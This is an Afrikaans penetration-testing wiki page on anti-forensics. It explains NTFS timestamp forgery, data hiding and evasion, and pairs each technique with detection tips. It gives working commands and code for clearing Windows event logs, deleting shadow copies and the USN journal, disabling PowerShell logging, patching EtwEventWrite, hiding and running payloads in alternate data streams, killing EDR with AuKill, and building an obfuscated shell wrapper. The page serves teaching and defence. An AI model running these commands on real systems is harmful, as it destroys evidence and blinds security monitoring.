# Anti-forensiese tegnieke

{{#include ../../banners/hacktricks-training.md}}

## Tydstempels

'n Aanvaller kan daarin belangstel om **die tydstempels van lêers te verander** om te voorkom dat hulle opgespoor word.\
Dit is moontlik om die tydstempels binne die MFT in die kenmerke `$STANDARD_INFORMATION` \_\_ en \_\_ `$FILE_NAME` te vind.

Albei kenmerke het 4 tydstempels: **Wysiging**, **toegang**, **skepping** en **MFT-registerwysiging** (MACE of MACB).

**Windows Explorer** en ander nutsprogramme wys die inligting uit **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensiese nutsprogram

Hierdie nutsprogram **verander** die tydstempelinligting binne **`$STANDARD_INFORMATION`**, **maar nie** die inligting binne **`$FILE_NAME`** nie. Daarom is dit moontlik om **verdagte aktiwiteit te identifiseer**.

### Usnjrnl

Die **USN Journal** (Update Sequence Number Journal) is 'n kenmerk van NTFS (Windows NT-lêerstelsel) wat veranderinge aan die volume byhou. Die [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv)-nutsprogram laat toe dat hierdie veranderinge ondersoek word.

![TimeStomp - Anti-forensiese nutsprogram - Usnjrnl: Die USN Journal (Update Sequence Number Journal) is 'n kenmerk van NTFS (Windows NT-lêerstelsel) wat veranderinge aan die volume byhou. Die...](<../../images/image (801).png>)

Die vorige beeld is die **uitvoer** wat deur die **nutsprogram** gewys word, waarin waargeneem kan word dat sommige **veranderinge aan die lêer aangebring is**.

### $LogFile

**Alle metadataveranderinge aan 'n lêerstelsel word aangeteken** in 'n proses wat bekend staan as [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Die aangetekende metadata word gehou in 'n lêer genaamd `**$LogFile**`, wat in die wortelgids van 'n NTFS-lêerstelsel geleë is. Nutsprogramme soos [LogFileParser](https://github.com/jschicht/LogFileParser) kan gebruik word om hierdie lêer te ontleed en veranderinge te identifiseer.

![Usnjrnl - $LogFile: Alle metadataveranderinge aan 'n lêerstelsel word aangeteken in 'n proses wat bekend staan as write-ahead logging. Die aangetekende metadata word gehou in 'n lêer genaamd $LogFile , wat in die wortel...](<../../images/image (137).png>)

Weereens is dit moontlik om in die uitvoer van die nutsprogram te sien dat **sommige veranderinge aangebring is**.

Met dieselfde nutsprogram is dit moontlik om te bepaal **na watter tyd die tydstempels verander is**:

![Usnjrnl - $LogFile: Met dieselfde nutsprogram is dit moontlik om te bepaal na watter tyd die tydstempels verander is](<../../images/image (1089).png>)

- CTIME: Lêer se skeppingstyd
- ATIME: Lêer se wysigingstyd
- MTIME: Lêer se MFT-registerwysiging
- RTIME: Lêer se toegangstyd

### Vergelyking van `$STANDARD_INFORMATION` en `$FILE_NAME`

Nog 'n manier om verdagte lêers waarvan die tydstempels verander is te identifiseer, is om die tyd in albei kenmerke te vergelyk en na **wanpassings** te soek.

### Nanosekondes

**NTFS**-tydstempels het 'n **presisie** van **100 nanosekondes**. Daarom is dit baie verdag om lêers met tydstempels soos 2010-10-10 10:10:**00.000:0000 te vind**.

### SetMace - Anti-forensiese nutsprogram

Hierdie nutsprogram kan albei kenmerke, `$STARNDAR_INFORMATION` en `$FILE_NAME`, verander. Sedert Windows Vista is 'n lewendige OS egter nodig om hierdie inligting te verander.

## Data wegsteek

NFTS gebruik 'n cluster en die minimum inligtinggrootte. Dit beteken dat indien 'n lêer een en 'n half cluster beslaan, die **oorblywende helfte nooit gebruik sal word nie** totdat die lêer geskrap word. Dit is dus moontlik om **data in hierdie slack space weg te steek**.

Daar is nutsprogramme soos slacker waarmee data in hierdie "versteekte" ruimte weggesteek kan word. 'n Ontleding van `$logfile` en `$usnjrnl` kan egter wys dat data bygevoeg is:

![SetMace - Anti-forensiese nutsprogram - Data wegsteek: Daar is nutsprogramme soos slacker waarmee data in hierdie "versteekte" ruimte weggesteek kan word. 'n Ontleding van $logfile en $usnjrnl kan egter wys dat...](<../../images/image (1060).png>)

Dit is dus moontlik om die slack space met nutsprogramme soos FTK Imager te herwin. Let daarop dat hierdie soort nutsprogram die inhoud verduister of selfs enkripteer kan stoor.

## UsbKill

Dit is 'n nutsprogram wat **die rekenaar afskakel indien enige verandering aan die USB-poorte** bespeur word.\
Een manier om dit te ontdek, is om die prosesse wat loop te ondersoek en **elke Python-skrip wat loop na te gaan**.

## Live Linux-verspreidings

Hierdie verspreidings word **in die RAM-geheue uitgevoer**. Die enigste manier om hulle op te spoor, is **indien die NTFS-lêerstelsel met skryftoestemmings gemonteer is**. As dit slegs met leestoestemmings gemonteer is, sal dit nie moontlik wees om die indringing op te spoor nie.

## Veilige verwydering

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Uitgestelde selfverwydering in Windows

'n Lopende Windows-image kan gesluit wees terwyl sy proses aktief is. 'n Proses kan die verwydering aan 'n kindproses `cmd.exe` oordra, `choice` as 'n timer gebruik en afsluit voordat die shell by `del` uitkom. Die vertraging laat die oorspronklike proses toe om sy image-hanteerder vry te stel; die volledige pad moet tussen aanhalingstekens geplaas word indien dit spasies bevat.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Wanneer hierdie string direk as argument aan `cmd.exe` verskaf word, eerder as om dit vanaf ’n ander interaktiewe `cmd`-prompt in te tik, gebruik `&` in plaas van `^&` en `>nul` in plaas van `^>nul`. Dit verwyder die gidsinskrywing; dit is **nie veilige uitwissing nie** en verwyder nie uitvoerings-, taak-, lêerstelseljoernaal- of ander forensiese spore nie. Soek na kortstondige `cmd.exe`-kindprosesse waarvan die opdragreël `choice /T`, `Del` en die ouerproses se beeldpad kombineer.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Windows-opstelling

Dit is moontlik om verskeie Windows-logboekmetodes te deaktiveer om die forensiese ondersoek heelwat moeiliker te maak.

### Deaktiveer tydstempels - UserAssist

Dit is ’n registersleutel wat die datums en tye byhou waarop die gebruiker elke uitvoerbare lêer laat loop het.

Om UserAssist te deaktiveer, is twee stappe nodig:

1. Stel twee registersleutels, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` en `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, albei op nul om aan te dui dat ons UserAssist wil deaktiveer.
2. Vee jou register-subboomtakke uit wat soos `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` lyk.

### Deaktiveer tydstempels - Prefetch

Dit stoor inligting oor die toepassings wat uitgevoer is met die doel om die werkverrigting van die Windows-stelsel te verbeter. Dit kan egter ook nuttig wees vir forensiese praktyke.

- Voer `regedit` uit
- Kies die lêerpad `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Regskliek op beide `EnablePrefetcher` en `EnableSuperfetch`
- Kies Modify op elkeen om die waarde van 1 (of 3) na 0 te verander
- Herbegin

### Deaktiveer tydstempels - Laaste toegangstyd

Wanneer ’n vouer vanaf ’n NTFS-volume op ’n Windows NT-bediener oopgemaak word, werk die stelsel ’n tydstempelveld op elke gelyste vouer by. Hierdie veld word die laaste toegangstyd genoem. Op ’n swaar gebruikte NTFS-volume kan dit werkverrigting beïnvloed.

1. Maak die Registerredigeerder (Regedit.exe) oop.
2. Blaai na `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Soek `NtfsDisableLastAccessUpdate`. As dit nie bestaan nie, voeg hierdie DWORD by en stel die waarde daarvan op 1 om die proses te deaktiveer.
4. Maak die Registerredigeerder toe en herbegin die bediener.

### Vee USB-geskiedenis uit

Al die **USB-toestelinskrywings** word in die Windows-register gestoor onder die **USBSTOR**-registersleutel. Dit bevat subsleutels wat geskep word wanneer jy ’n USB-toestel by jou rekenaar of skootrekenaar inprop. Jy kan hierdie sleutel hier vind: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. As jy dit **uitvee**, vee jy die USB-geskiedenis uit.\
Jy kan ook die nutsprogram [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) gebruik om seker te maak dat jy hulle uitgevee het (en om hulle uit te vee).

Nog ’n lêer wat inligting oor USB-toestelle stoor, is die lêer `setupapi.dev.log` in `C:\Windows\INF`. Hierdie lêer moet ook uitgevee word.

### Deaktiveer Shadow Copies

**Lys** Shadow Copies met `vssadmin list shadowstorage`\
**Vee** hulle uit deur `vssadmin delete shadow` uit te voer.

Jy kan hulle ook via die GUI uitvee deur die stappe te volg wat voorgestel word by [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Om Shadow Copies te deaktiveer, volg [die stappe hier](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Maak die Services-program oop deur "services" in die tekssoekkassie in te tik nadat jy op die Windows-beginknoppie geklik het.
2. Soek "Volume Shadow Copy" in die lys, kies dit en maak dan Properties oop deur regs te klik.
3. Kies Disabled in die "Startup type"-aftrekkieslys en bevestig die verandering deur Apply en OK te klik.

Dit is ook moontlik om in die register die opstelling te wysig van watter lêers in die Shadow Copy gekopieer gaan word: `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Oorskryf geskrapte lêers

- Jy kan ’n **Windows-nutsprogram** gebruik: `cipher /w:C`. Dit laat cipher enige data uit die beskikbare ongebruikte skyfspasie op die C-skyf verwyder.
- Jy kan ook nutsprogramme soos [**Eraser**](https://eraser.heidi.ie) gebruik.

### Vee Windows-gebeurtenislogboeke uit

- Windows + R --> eventvwr.msc --> Vou "Windows Logs" uit --> Regsklik op elke kategorie en kies "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Deaktiveer Windows-gebeurtenislogboeke

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Deaktiveer die diens "Windows Event Log" in die dienste-afdeling.
- `WEvtUtil.exec clear-log` of `WEvtUtil.exe cl`

### Deaktiveer $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Gevorderde aantekening en peuter met nasporingsdata (2023-2025)

### PowerShell ScriptBlock-/Module-logging

Onlangse weergawes van Windows 10/11 en Windows Server hou **omvattende PowerShell-forensiese artefakte** onder
`Microsoft-Windows-PowerShell/Operational` (gebeurtenisse 4104/4105/4106).  
Aanvallers kan dit intyds deaktiveer of uitvee:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Verdedigers behoort veranderinge aan daardie registersleutels en grootskaalse verwydering van PowerShell-gebeurtenisse te monitor.

### ETW (Event Tracing for Windows) Patch

Eindpuntsekuriteitsprodukte maak sterk staat op ETW. ’n Gewilde ontduikingsmetode in 2024 is om `ntdll!EtwEventWrite`/`EtwEventWriteFull` in die geheue te patch sodat elke ETW-oproep `STATUS_SUCCESS` terugstuur sonder om die gebeurtenis uit te stuur:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Openbare PoCs (bv. `EtwTiSwallow`) implementeer dieselfde primitief in PowerShell of C++.  
Omdat die patch **proseslokaal** is, kan EDRs wat binne ander prosesse loop dit miskyk.<sup>[[5]](#references)</sup>
Opsporing: vergelyk `ntdll` in die geheue met die kopie op die skyf, of plaas ’n hook voordat user mode begin.

### Herlewing van Alternate Data Streams (ADS)

Daar is gesien dat malware-veldtogte in 2023 (bv. **FIN12**-loaders) tweede-fase-binaries in ADS plaas om buite die sig van tradisionele skandeerders te bly:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Enumereer streams met `dir /R`, `Get-Item -Stream *` of Sysinternals se `streams64.exe`.
Wanneer die gasheerlêer na FAT/exFAT of via SMB gekopieer word, word die versteekte stream verwyder; ondersoekers kan dit gebruik
om die payload te herwin.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver word nou gereeld vir **anti-forensics** in ransomware-inbrake gebruik.  
Die oopbronhulpmiddel **AuKill** laai ’n getekende, maar kwesbare driver (`procexp152.sys`) om EDR- en forensiese sensors op te skort of te beëindig **voor enkripsie en logvernietiging**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Die driver word daarna verwyder, wat minimale artefakte agterlaat.<sup>[[1]](#references)</sup>  
Versagtingsmaatreëls: aktiveer die Microsoft-lys van geblokkeerde kwesbare drivers (HVCI/SAC),
en stel waarskuwings in vir die skepping van kernel-dienste vanaf gebruiker-skryfbare paaie.

---

## Linux Anti-Forensics: Self‑patching en Cloud C2 (2023–2025)

### Self‑patching van gekompromitteerde dienste om opsporing te verminder (Linux)
Teenstanders “self‑patch” toenemend ’n diens direk nadat hulle dit uitgebuit het, om sowel heruitbuiting te voorkom as kwesbaarheidsgebaseerde opsporing te onderdruk. Die idee is om kwesbare komponente met die nuutste legitieme upstream-binaries/JARs te vervang, sodat skandeerders rapporteer dat die gasheer reggemaak is terwyl volharding en C2 behoue bly.<sup>[[3]](#references)</sup>

Voorbeeld: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Ná uitbuiting het aanvallers legitieme JARs van Maven Central (repo1.maven.org) afgelaai, kwesbare JARs in die ActiveMQ-installasie uitgevee en die broker herbegin.
- Dit het die aanvanklike RCE afgesluit terwyl ander vastrapplekke behoue gebly het (cron, veranderinge aan SSH-konfigurasie, afsonderlike C2-implants).

Operasionele voorbeeld (ter illustrasie)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Forensiese/soekwenke
- Gaan diensgidse na vir ongeskeduleerde vervanging van binaries/JAR-lêers:
  - Debian/Ubuntu: `dpkg -V activemq` en vergelyk lêerhashes/-paaie met repo-spieëls.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Soek na JAR-weergawes op skyf wat nie deur die pakketbestuurder besit word nie, of simboliese skakels wat buite die gewone proses opgedateer is.
- Tydlyn: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` om ctime/mtime met die tydperk van die inbraak in verband te bring.
- Shell-geskiedenis/prosestelemetrie: bewyse van `curl`/`wget` na `repo1.maven.org` of ander artefak-CDN’s onmiddellik ná die aanvanklike uitbuiting.
- Veranderingsbestuur: bevestig wie die “patch” toegepas het en waarom, nie net dat ’n gepatchte weergawe teenwoordig is nie.

### C2 via wolkdienste met bearer tokens en anti-analise-stagers
Waargenome tradecraft het verskeie langtermyn-C2-roetes en anti-analise-verpakking gekombineer:<sup>[[3]](#references)</sup>
- Wagwoordbeskermde PyInstaller ELF-laaiers om sandboxing en statiese analise te bemoeilik (bv. geënkripteerde PYZ, tydelike onttrekking onder `/_MEI*`).
  - Aanwysers: `strings`-treffers soos `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Looptydartefakte: onttrekking na `/tmp/_MEI*` of pasgemaakte `--runtime-tmpdir`-paaie.
- Dropbox-gesteunde C2 met hardgekodeerde OAuth Bearer tokens
  - Netwerkmerkers: `api.dropboxapi.com` / `content.dropboxapi.com` met `Authorization: Bearer <token>`.
  - Soek in proxy/NetFlow/Zeek/Suricata na uitgaande HTTPS-verkeer na Dropbox-domeine vanaf bedienerwerklaste wat nie gewoonlik lêers sinkroniseer nie.
- Parallelle/rugsteun-C2 via tonneling (bv. Cloudflare Tunnel `cloudflared`), om beheer te behou indien een kanaal geblokkeer word.
  - Gasheer-IOC’s: `cloudflared`-prosesse/-eenhede, konfigurasie by `~/.cloudflared/*.json`, uitgaande verkeer op poort 443 na Cloudflare-randpunte.

### Volharding en “terugdraai van verharding” om toegang te behou (Linux-voorbeelde)
Aanvallers kombineer self-patching dikwels met volhoubare toegangspaaie:<sup>[[3]](#references)</sup>
- Cron/Anacron: wysigings aan die `0anacron`-stompie in elke `/etc/cron.*/`-gids vir periodieke uitvoering.
  - Soek:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Terugrol van SSH-konfigurasieverharding: aktiveer root-aanmeldings en verander verstekdoppe vir laevoorregte rekeninge.
  - Soek na die aktivering van root-aanmeldings:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Soek na verdagte interaktiewe shells op stelselrekeninge (bv. `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Lukrake, kortbenoemde beacon-artefakte (8 alfabetiese karakters) wat op skyf neergeskryf word en ook met cloud C2 kommunikeer:
  - Soek:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Verdedigers behoort hierdie artefakte met eksterne blootstelling en dienspleisteringsgebeure te korreleer om anti-forensiese selfremediëring op te spoor wat gebruik word om aanvanklike uitbuiting te verberg.

## Statiese ingebedde-shell-uitvoering

’n Script-omhulsel met ’n ingebedde interpreter en opdragimplementasies kan ondersteunde shell-bewerkings binne een uitvoerbare lêer uitvoer, eerder as om `/bin/sh` en afsonderlike nutsprosesse te begin. HimitsuShell bou so ’n statiese musl-binêre lêer. Anders as [SHc-omhulsels](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md), hoef die ingeboude opdragte nie die gasheer-shell of ’n afsonderlike nutsproses te begin nie. Nie-ondersteunde opdragte kan na die stelsel-shell terugval.<sup>[[9]](#references)</sup>

Dit verminder die sigbaarheid van shell-prosesse en kind-`execve`-prosesse.<sup>[[9]](#references)</sup> Die omhulselproses en sy stelseloproepe bly waarneembaar deur kernnasporingspunte, dus moet die projek se bewering dat dit selfs vir kernnasporing onsigbaar is, nie letterlik opgeneem word nie.<sup>[[9]](#references)[[11]](#references)</sup>

Vir die gedokumenteerde x86_64-bou, hou die invoerlêer se naam as `launcher.sh` en kopieer dit na die houer voordat jy dit saamstel. Die uitset is `safeLauncher`:<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

Die publieke `compile.sh` enkripteer die script met AES-256-CTR, enkripteer die vervalwaarde en tussenliggende sleutels/IV’s met AES-256-CBC, skakel die geënkripteerde lêers met `xxd -i` om na C-skikkings, en koppel hulle met `lib.bc` deur `-static -s` te gebruik. Die finale enkripsiesleutel en IV is ook ingebed, dus bied dit weerstand teen terloopse statiese onttrekking, maar is dit nie ’n geheim wat nooit herwin kan word nie.<sup>[[10]](#references)</sup>

Die verstek-LLVM-passe is `-sobf` en `-sub`. Wysig `/var/work/compile.sh` voordat jy bou om gedokumenteerde alternatiewe soos control-flow flattening (`fla`) of bogus control flow (`bcf`) te aktiveer.<sup>[[9]](#references)[[10]](#references)</sup>

Toets script-versoenbaarheid voordat jy op hierdie wrapper staatmaak: die projek teiken POSIX-shell-sintaksis, waarsku dat Bash/Zsh-scripts dalk kan misluk, en meld dat opdragte buite die ingeboude stel die stelsel se shell aanroep.<sup>[[9]](#references)</sup>

Vir ontleding van afgeplatte control flow, sien [om afgeplatte control flow met ’n nou uitvoeringsnit te omseil](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice).

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill: ’n Gewapende kwesbare drywer om EDR te deaktiveer (Maart 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite vir stealth: Opsporing en jag (Junie 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching vir volharding: Hoe DripDropper Linux-malware deur die cloud beweeg](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Versteek jou .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Onthulling van ’n SectopRAT-variant wat in wettige sagteware ingebed is](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – choice-opdrag](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – del-opdrag](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [HimitsuShell README](https://github.com/HimitsuShell/HimitsuShell)
- [10] [HimitsuShell-bouskrip](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Linux-kerngebeurtenishistogramme en syscall-opsporing](https://docs.kernel.org/trace/histogram.html)
